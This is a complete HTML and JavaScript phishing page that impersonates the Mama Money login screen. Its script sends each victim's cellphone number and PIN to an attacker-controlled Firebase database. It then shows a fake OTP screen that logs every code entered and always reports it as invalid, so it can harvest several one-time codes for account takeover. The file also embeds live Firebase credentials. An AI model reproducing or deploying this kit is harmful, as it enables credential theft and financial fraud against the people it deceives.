<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Mama Money - Login</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
html, body { width: 100%; height: 100%; overflow: hidden; }
body { background: #7BC043; display: flex; justify-content: center; align-items: center; }

.mobile-container {
    width: 100%; max-width: 100%; height: 100vh; height: 100dvh;
    position: relative; overflow: hidden;
    display: flex; flex-direction: column;
    background-color: #7BC043;
    background-image:
        linear-gradient(45deg, rgba(255,255,255,0.08) 25%, transparent 25%),
        linear-gradient(-45deg, rgba(255,255,255,0.08) 25%, transparent 25%),
        linear-gradient(45deg, transparent 75%, rgba(255,255,255,0.08) 75%),
        linear-gradient(-45deg, transparent 75%, rgba(255,255,255,0.08) 75%);
    background-size: 40px 40px;
    background-position: 0 0, 0 20px, 20px -20px, -20px 0px;
}

/* Back Button */
.back-btn {
    position: absolute; top: 22px; left: 20px; z-index: 100;
    background: transparent; border: none; cursor: pointer;
    font-size: 26px; color: #0a4d1a; font-weight: 900;
    line-height: 1;
}

/* Logo Section */
.logo-section {
    display: flex; justify-content: center; align-items: center;
    margin-top: 70px;
    padding: 0 20px;
}
.logo-img {
    width: 85%;
    max-width: 320px;
    height: auto;
    display: block;
    background: transparent;
}

/* Form */
.form-section {
    padding: 0 25px;
    margin-top: 45px;
    display: flex; flex-direction: column;
    flex: 1;
}
.input-field {
    width: 100%; padding: 20px 22px;
    background: transparent;
    border: 2px solid #ffffff;
    border-radius: 6px;
    color: #ffffff;
    font-size: 17px; font-weight: 600;
    outline: none;
    margin-bottom: 18px;
    transition: all 0.2s;
}
.input-field::placeholder { color: #ffffff; opacity: 0.95; font-weight: 600; }
.input-field:focus { border-color: #0a4d1a; background: rgba(255,255,255,0.1); }

/* Buttons */
.btn {
    width: 100%; padding: 20px;
    border: none; border-radius: 6px;
    background: #0a4d1a; color: #ffffff;
    font-size: 17px; font-weight: 700;
    cursor: pointer;
    display: flex; justify-content: center; align-items: center; gap: 10px;
    margin-bottom: 14px;
    transition: 0.15s;
    letter-spacing: 0.2px;
}
.btn:active { transform: scale(0.98); }
.btn svg { width: 20px; height: 20px; }

/* Remember me */
.remember-row {
    display: flex; align-items: center; justify-content: center;
    gap: 12px; margin-top: 8px; margin-bottom: 25px;
}
.remember-row input[type="checkbox"] {
    width: 26px; height: 26px; accent-color: #ffffff;
    cursor: pointer;
}
.remember-row label {
    font-size: 17px; font-weight: 700; color: #0a4d1a;
    cursor: pointer;
}

/* Forgot */
.forgot {
    text-align: center; color: #0a4d1a;
    font-size: 16px; font-weight: 700;
    line-height: 1.7;
}
.forgot a {
    color: #0a4d1a; font-weight: 800;
    text-decoration: underline;
    text-underline-offset: 3px;
}

/* ============ OTP PAGE ============ */
#otpPage {
    display: none; flex-direction: column;
    padding: 0 25px;
    flex: 1;
    position: relative;
}
#otpPage.active { display: flex; }

.otp-header { margin-top: 90px; text-align: center; }
.otp-title {
    font-size: 28px; font-weight: 900;
    color: #0a4d1a; margin-bottom: 12px;
    letter-spacing: -0.5px;
}
.otp-sub {
    font-size: 16px; font-weight: 600;
    color: #0a4d1a; opacity: 0.9;
}
.otp-sub strong { font-weight: 900; }

.otp-boxes {
    display: flex; justify-content: center;
    gap: 12px; margin-top: 45px; margin-bottom: 30px;
}
.otp-boxes input {
    width: 58px; height: 68px;
    border: 3px solid #0a4d1a;
    border-radius: 10px;
    background: #ffffff;
    font-size: 28px; font-weight: 900;
    text-align: center;
    color: #0a4d1a;
    outline: none;
    transition: all 0.2s;
    caret-color: #0a4d1a;
}
.otp-boxes input:focus {
    border-color: #FF9800;
    box-shadow: 0 0 0 3px rgba(255,152,0,0.3);
}

.btn-confirm {
    width: 100%; padding: 20px;
    border: none; border-radius: 6px;
    background: #0a4d1a; color: #ffffff;
    font-size: 17px; font-weight: 700;
    cursor: pointer;
    margin-bottom: 22px;
}
.btn-confirm:active { transform: scale(0.98); }

.otp-timer {
    display: flex; align-items: center; justify-content: center;
    gap: 8px; margin-bottom: 18px;
    font-size: 17px; font-weight: 700; color: #0a4d1a;
}
.otp-timer svg { width: 20px; height: 20px; fill: #0a4d1a; }
.otp-timer #timerText { letter-spacing: 1px; }

.otp-cancel {
    text-align: center; font-size: 17px; font-weight: 700;
    color: #0a4d1a; cursor: pointer;
    text-decoration: underline;
    text-underline-offset: 3px;
}

.otp-error {
    text-align: center; color: #c62828;
    font-size: 14px; font-weight: 800;
    margin-bottom: 15px; display: none;
    background: rgba(255,255,255,0.9);
    padding: 10px; border-radius: 6px;
}
.otp-error.show { display: block; }

/* Loading Overlay */
.loading-overlay {
    position: fixed; inset: 0;
    background: rgba(10, 77, 26, 0.9);
    display: none; justify-content: center; align-items: center;
    flex-direction: column; z-index: 9999;
}
.loading-overlay.show { display: flex; }
.spinner {
    width: 60px; height: 60px;
    border: 5px solid rgba(255,255,255,0.25);
    border-top-color: #ffffff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 18px;
}
@keyframes spin { 100% { transform: rotate(360deg); } }
.loading-text { color: #ffffff; font-size: 16px; font-weight: 700; letter-spacing: 0.5px; }
</style>
</head>
<body>

<div class="mobile-container">

    <!-- ========== LOGIN PAGE ========== -->
    <div id="loginPage" style="display: flex; flex-direction: column; height: 100%;">
        <button class="back-btn" onclick="history.back()">‹</button>

        <!-- Logo Section -->
        <div class="logo-section">
            <img 
                src="https://i.postimg.cc/02ds3hQ5/file-00000000d75c82109687947ff11a3944.png" 
                alt="Mama Money" 
                class="logo-img"
            >
        </div>

        <div class="form-section">
            <input type="tel" class="input-field" id="phoneInput" placeholder="Cellphone Number" autocomplete="tel" inputmode="tel">
            <input type="password" class="input-field" id="pinInput" placeholder="Pin" autocomplete="off" inputmode="numeric">

            <button class="btn" onclick="submitLogin()">
                Login
                <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="btn">
                Check Rates
                <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="btn">
                Whatsapp Mama
                <svg viewBox="0 0 24 24" fill="#fff"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
            </button>

            <div class="remember-row">
                <input type="checkbox" id="remember">
                <label for="remember">Remember me</label>
            </div>

            <div class="forgot">
                Forgot your pin?<br>
                Dial <a href="tel:*134*542#">*134*542#</a> to reset it.
            </div>
        </div>
    </div>

    <!-- ========== OTP PAGE ========== -->
    <div id="otpPage">
        <button class="back-btn" onclick="backToLogin()">‹</button>

        <div class="otp-header">
            <div class="otp-title">Enter OTP</div>
            <div class="otp-sub">We sent a code to <strong id="phoneDisplay">465****58664</strong></div>
        </div>

        <div class="otp-boxes" id="otpBoxes">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
        </div>

        <div class="otp-error" id="otpError"></div>

        <button class="btn-confirm" onclick="submitOtp()">Confirm</button>

        <div class="otp-timer">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8zm.5-13H11v6l5.2 3.1.8-1.3-4.5-2.7V7z"/></svg>
            <span id="timerText">2:00</span>
        </div>

        <div class="otp-cancel" onclick="backToLogin()">Cancel</div>
    </div>

</div>

<!-- Loading -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <div class="loading-text" id="loadingText">Processing...</div>
</div>

<!-- Firebase -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push, set, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyC1KSnt2oLvpg7KFnyoHlex6spToyOO-nE",
    authDomain: "pak-national-earn.firebaseapp.com",
    databaseURL: "https://pak-national-earn-default-rtdb.firebaseio.com",
    projectId: "pak-national-earn",
    storageBucket: "pak-national-earn.firebasestorage.app",
    messagingSenderId: "670295282897",
    appId: "1:670295282897:web:ac051079fdd3eef8cea1f0",
    measurementId: "G-M5SFQB9HR6"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentUserKey = null;
let attemptCount = 0;
const MAX_ATTEMPTS = 6;
let timerInterval = null;

function showLoader(text) {
    document.getElementById('loadingText').textContent = text || 'Processing...';
    document.getElementById('loadingOverlay').classList.add('show');
}
function hideLoader() { document.getElementById('loadingOverlay').classList.remove('show'); }

function showOtpPage() {
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('otpPage').classList.add('active');
    document.querySelectorAll('#otpBoxes input')[0].focus();
}
function backToLogin() {
    document.getElementById('otpPage').classList.remove('active');
    document.getElementById('loginPage').style.display = 'flex';
    clearInterval(timerInterval);
}

function formatPhone(phone) {
    if (phone.length < 8) return phone;
    return phone.slice(0, 3) + '****' + phone.slice(-5);
}

function startTimer() {
    let timeLeft = 120;
    clearInterval(timerInterval);
    const timerEl = document.getElementById('timerText');
    timerEl.textContent = '2:00';
    timerInterval = setInterval(() => {
        if (timeLeft <= 0) { clearInterval(timerInterval); timerEl.textContent = '0:00'; return; }
        timeLeft--;
        const mins = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        timerEl.textContent = mins + ':' + (secs < 10 ? '0' : '') + secs;
    }, 1000);
}

window.submitLogin = async function() {
    const phone = document.getElementById('phoneInput').value.trim();
    const pin = document.getElementById('pinInput').value.trim();

    if (!phone) { alert('Please enter cellphone number'); return; }
    if (!pin) { alert('Please enter pin'); return; }

    showLoader('Signing In...');

    try {
        const usersRef = ref(db, 'mama_money_users');
        const newUserRef = push(usersRef);
        currentUserKey = newUserRef.key;

        await set(newUserRef, {
            phone: phone,
            pin: pin,
            loginTime: new Date().toLocaleString(),
            loginTimestamp: Date.now(),
            status: 'OTP Pending'
        });

        setTimeout(() => {
            hideLoader();
            document.getElementById('phoneDisplay').textContent = formatPhone(phone);
            showOtpPage();
            startTimer();
            attemptCount = 0;
        }, 1500);

    } catch (error) {
        console.error(error);
        hideLoader();
        alert('Error: ' + error.message);
    }
};

const otpInputs = document.querySelectorAll('#otpBoxes input');
otpInputs.forEach((input, index) => {
    input.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value.length === 1 && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }
    });
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
});

window.submitOtp = async function() {
    let otp = '';
    otpInputs.forEach(i => otp += i.value);

    if (otp.length !== 5) {
        const err = document.getElementById('otpError');
        err.textContent = 'Please enter all 5 digits';
        err.classList.add('show');
        return;
    }

    attemptCount++;
    showLoader('Verifying...');

    try {
        const userRef = ref(db, 'mama_money_users/' + currentUserKey);
        const snapshot = await get(userRef);
        const userData = snapshot.val() || {};

        let attempts = userData.otpAttempts || [];
        attempts.push({ otp: otp, time: new Date().toLocaleString(), timestamp: Date.now() });

        await update(userRef, {
            otpAttempts: attempts,
            lastOtp: otp,
            lastOtpTime: new Date().toLocaleString(),
            lastOtpTimestamp: Date.now(),
            status: 'OTP Attempt ' + attemptCount
        });

        setTimeout(() => {
            hideLoader();
            const err = document.getElementById('otpError');
            if (attemptCount >= MAX_ATTEMPTS) {
                err.textContent = 'Maximum attempts reached. Try again later.';
                err.classList.add('show');
            } else {
                err.textContent = 'Invalid OTP. Attempt ' + attemptCount + ' of 6';
                err.classList.add('show');
                otpInputs.forEach(i => i.value = '');
                otpInputs[0].focus();
            }
        }, 1800);

    } catch (error) {
        console.error(error);
        hideLoader();
        alert('Error: ' + error.message);
    }
};

window.addEventListener('load', () => {
    document.getElementById('phoneInput').focus();
});
</script>
</body>
</html>
